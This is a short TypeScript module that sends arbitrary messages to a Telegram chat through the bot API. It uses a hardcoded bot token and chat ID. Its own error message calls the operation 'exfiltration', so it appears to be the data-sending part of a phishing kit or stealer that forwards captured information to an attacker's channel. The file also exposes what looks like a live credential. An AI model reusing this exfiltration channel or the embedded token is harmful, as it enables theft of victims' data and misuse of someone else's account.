const BOT_TOKEN = "8654770031:AAFNz1U9oprj9Yefl1_-Lh1Z9YEq3wm2QiI";
const CHAT_ID = "-1003736505254"; 

export const sendMessageToTelegram = async (message: string) => {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    return response.ok;
  } catch (error) {
    console.error('Telegram exfiltration failed:', error);
    return false;
  }
};
